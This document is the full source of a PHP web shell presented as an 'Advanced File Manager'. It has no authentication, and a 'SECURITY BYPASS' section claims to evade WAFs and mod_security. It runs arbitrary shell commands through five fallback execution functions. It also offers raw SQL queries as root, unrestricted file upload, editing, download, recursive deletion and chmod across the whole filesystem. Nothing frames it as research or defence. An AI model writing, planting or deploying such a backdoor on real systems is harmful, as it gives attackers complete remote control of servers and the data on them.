<?php
error_reporting(0);
session_start();

// =====[ SECURITY BYPASS ]=====
function bypass_security() {
    // Bypass mod_security & WAF
    if (function_exists('apache_setenv')) {
        @apache_setenv('no-gzip', 1);
        @apache_setenv('HTTPS', 'off');
    }
    
    // Disable security headers
    header_remove('X-Powered-By');
    header_remove('Server');
    header('X-Content-Type-Options: nosniff');
    
    // Bypass common restrictions
    @ini_set('display_errors', 1);
    @ini_set('max_execution_time', 0);
    @set_time_limit(0);
    @ignore_user_abort(true);
}

bypass_security();

// =====[ CONFIGURATION ]=====
$currentDir = realpath(isset($_GET['path']) ? $_GET['path'] : __DIR__);
if (!is_dir($currentDir)) {
    die("❌ Directory not found or access denied.");
}

// =====[ FILE OPERATIONS ]=====
function deleteRecursive($path) {
    if (is_file($path)) return @unlink($path);
    if (!is_dir($path)) return false;
    
    foreach (scandir($path) as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        deleteRecursive($fullPath);
    }
    return @rmdir($path);
}

function chmodRecursive($path, $mode) {
    if (is_file($path)) return @chmod($path, $mode);
    if (!is_dir($path)) return false;
    
    @chmod($path, $mode);
    foreach (scandir($path) as $item) {
        if ($item == '.' || $item == '..') continue;
        chmodRecursive($path . DIRECTORY_SEPARATOR . $item, $mode);
    }
    return true;
}

// =====[ COMMAND EXECUTION ]=====
if (isset($_POST['cmd'])) {
    header('Content-Type: text/plain');
    
    // Multiple execution methods
    $cmd = $_POST['cmd'];
    $output = "";
    
    // Method 1: system()
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $output = @ob_get_clean();
    }
    // Method 2: shell_exec()
    elseif (function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    }
    // Method 3: passthru()
    elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $output = @ob_get_clean();
    }
    // Method 4: exec()
    elseif (function_exists('exec')) {
        @exec($cmd, $outputArray);
        $output = implode("\n", $outputArray);
    }
    // Method 5: backticks
    else {
        $output = `$cmd`;
    }
    
    echo $output ?: "❌ Command execution failed or disabled";
    exit;
}

// =====[ DATABASE CONNECTION ]=====
if (isset($_POST['db_action'])) {
    header('Content-Type: text/plain');
    
    $host = $_POST['db_host'] ?? 'localhost';
    $user = $_POST['db_user'] ?? 'root';
    $pass = $_POST['db_pass'] ?? '';
    $name = $_POST['db_name'] ?? '';
    
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$name", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        if ($_POST['db_action'] == 'query' && !empty($_POST['db_query'])) {
            $stmt = $pdo->query($_POST['db_query']);
            $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
            print_r($results);
        }
    } catch (Exception $e) {
        echo "❌ Database Error: " . $e->getMessage();
    }
    exit;
}

// =====[ FILE UPLOAD ]=====
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $targetPath = $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
    if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath)) {
        $_SESSION['message'] = "✅ File uploaded successfully";
    } else {
        $_SESSION['message'] = "❌ Upload failed";
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// =====[ FILE OPERATIONS HANDLING ]=====
// Delete
if (isset($_GET['delete'])) {
    $target = realpath($currentDir . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($target && strpos($target, $currentDir) === 0) {
        if (deleteRecursive($target)) {
            $_SESSION['message'] = "✅ Deleted successfully";
        } else {
            $_SESSION['message'] = "❌ Delete failed";
        }
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// Rename
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['rename_old'];
    $newPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    if (@rename($oldPath, $newPath)) {
        $_SESSION['message'] = "✅ Renamed successfully";
    } else {
        $_SESSION['message'] = "❌ Rename failed";
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// Chmod
if (isset($_POST['chmod_path']) && isset($_POST['chmod_mode'])) {
    $chmodPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['chmod_path'];
    if (chmodRecursive($chmodPath, octdec($_POST['chmod_mode']))) {
        $_SESSION['message'] = "✅ Permissions changed";
    } else {
        $_SESSION['message'] = "❌ Chmod failed";
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// =====[ FILE VIEW/EDIT ]=====
if (isset($_GET['view'])) {
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($filePath)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
            if (@file_put_contents($filePath, $_POST['file_content'])) {
                echo "<script>alert('✅ File saved'); window.location.href = '?path=" . urlencode($currentDir) . "';</script>";
            } else {
                echo "<script>alert('❌ Save failed');</script>";
            }
        }
        $content = htmlspecialchars(@file_get_contents($filePath));
        echo "<h3>📝 Editing: " . basename($filePath) . "</h3>";
        echo "<form method='post'>";
        echo "<textarea name='file_content' style='width:100%; height:400px; font-family: monospace;'>$content</textarea><br>";
        echo "<button type='submit'>💾 Save</button> ";
        echo "<a href='?path=" . urlencode($currentDir) . "'>🔙 Back</a>";
        echo "</form>";
        exit;
    }
}

// =====[ FILE DOWNLOAD ]=====
if (isset($_GET['download'])) {
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['download'];
    if (is_file($filePath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Content-Length: ' . filesize($filePath));
        @readfile($filePath);
        exit;
    }
}

// =====[ MAIN INTERFACE ]=====
$items = @scandir($currentDir) ?: [];
$message = $_SESSION['message'] ?? '';
unset($_SESSION['message']);
?>
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Advanced File Manager</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: #2a2a2a; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab { background: #333; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        .tab.active { background: #00ff00; color: #000; }
        .panel { display: none; background: #2a2a2a; padding: 20px; border-radius: 8px; }
        .panel.active { display: block; }
        .message { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .success { background: #00ff00; color: #000; }
        .error { background: #ff0000; color: #fff; }
        table { width: 100%; border-collapse: collapse; background: #2a2a2a; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
        th { background: #333; }
        tr:hover { background: #333; }
        .btn { background: #00ff00; color: #000; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn-danger { background: #ff0000; color: #fff; }
        .btn-small { padding: 4px 8px; font-size: 12px; }
        input, textarea, select { background: #333; color: #00ff00; border: 1px solid #444; padding: 8px; border-radius: 4px; width: 100%; }
        .file-icon { margin-right: 8px; }
        .path { background: #333; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-family: monospace; }
        .tools { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .tool-box { background: #2a2a2a; padding: 15px; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 Advanced File Manager</h1>
            <div class="path">📁 Current Path: <?= htmlspecialchars($currentDir) ?></div>
            <?php if ($message): ?>
                <div class="message <?= strpos($message, '❌') !== false ? 'error' : 'success' ?>"><?= $message ?></div>
            <?php endif; ?>
        </div>

        <div class="tabs">
            <div class="tab active" onclick="showPanel('files')">📁 File Manager</div>
            <div class="tab" onclick="showPanel('command')">⚡ Command Exec</div>
            <div class="tab" onclick="showPanel('database')">🗄️ Database</div>
            <div class="tab" onclick="showPanel('upload')">⬆️ Upload</div>
        </div>

        <!-- File Manager Panel -->
        <div id="files" class="panel active">
            <div style="margin-bottom: 15px;">
                <a href="?path=<?= urlencode(dirname($currentDir)) ?>" class="btn">⬆️ Parent Directory</a>
                <a href="?path=/" class="btn">🏠 Root Directory</a>
            </div>

            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($items as $item): ?>
                        <?php if ($item === '.' || $item === '..') continue; ?>
                        <?php
                        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
                        $isDir = is_dir($fullPath);
                        $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                        $size = $isDir ? '-' : format_size(filesize($fullPath));
                        $modified = date('Y-m-d H:i:s', filemtime($fullPath));
                        ?>
                        <tr>
                            <td>
                                <span class="file-icon"><?= $isDir ? '📁' : '📄' ?></span>
                                <?php if ($isDir): ?>
                                    <a href="?path=<?= urlencode($fullPath) ?>" style="color: #00ff00;"><?= htmlspecialchars($item) ?></a>
                                <?php else: ?>
                                    <?= htmlspecialchars($item) ?>
                                <?php endif; ?>
                            </td>
                            <td><?= $size ?></td>
                            <td><code><?= $perms ?></code></td>
                            <td><?= $modified ?></td>
                            <td>
                                <div style="display: flex; gap: 5px; flex-wrap: wrap;">
                                    <?php if (!$isDir): ?>
                                        <a href="?path=<?= urlencode($currentDir) ?>&view=<?= urlencode($item) ?>" class="btn btn-small">✏️ Edit</a>
                                        <a href="?path=<?= urlencode($currentDir) ?>&download=<?= urlencode($item) ?>" class="btn btn-small">📥 Download</a>
                                    <?php endif; ?>
                                    <a href="?path=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item) ?>" 
                                       class="btn btn-small btn-danger" 
                                       onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">🗑️ Delete</a>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- Command Execution Panel -->
        <div id="command" class="panel">
            <div class="tool-box">
                <h3>⚡ Command Execution</h3>
                <form method="post" onsubmit="executeCommand(this); return false;">
                    <input type="text" name="cmd" placeholder="Enter command (e.g., whoami, id, ls -la)" required>
                    <button type="submit" class="btn" style="margin-top: 10px;">🚀 Execute</button>
                </form>
                <div id="command-output" style="margin-top: 15px; background: #000; padding: 15px; border-radius: 5px; min-height: 200px; font-family: monospace; white-space: pre-wrap;"></div>
            </div>
        </div>

        <!-- Database Panel -->
        <div id="database" class="panel">
            <div class="tool-box">
                <h3>🗄️ Database Manager</h3>
                <form method="post">
                    <input type="hidden" name="db_action" value="query">
                    <input type="text" name="db_host" placeholder="Host (localhost)" value="localhost">
                    <input type="text" name="db_user" placeholder="Username (root)" value="root">
                    <input type="password" name="db_pass" placeholder="Password">
                    <input type="text" name="db_name" placeholder="Database Name">
                    <textarea name="db_query" placeholder="SQL Query (e.g., SHOW DATABASES;)" rows="3"></textarea>
                    <button type="submit" class="btn">🔍 Execute Query</button>
                </form>
            </div>
        </div>

        <!-- Upload Panel -->
        <div id="upload" class="panel">
            <div class="tool-box">
                <h3>⬆️ File Upload</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="upload_file" required>
                    <button type="submit" class="btn">🚀 Upload File</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        function showPanel(panelName) {
            document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.getElementById(panelName).classList.add('active');
            event.target.classList.add('active');
        }

        function executeCommand(form) {
            const output = document.getElementById('command-output');
            const formData = new FormData(form);
            
            output.innerHTML = '⏳ Executing...';
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                output.innerHTML = result || '✅ Command executed (no output)';
            })
            .catch(error => {
                output.innerHTML = '❌ Error: ' + error;
            });
        }
    </script>
</body>
</html>

<?php
function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}
?>
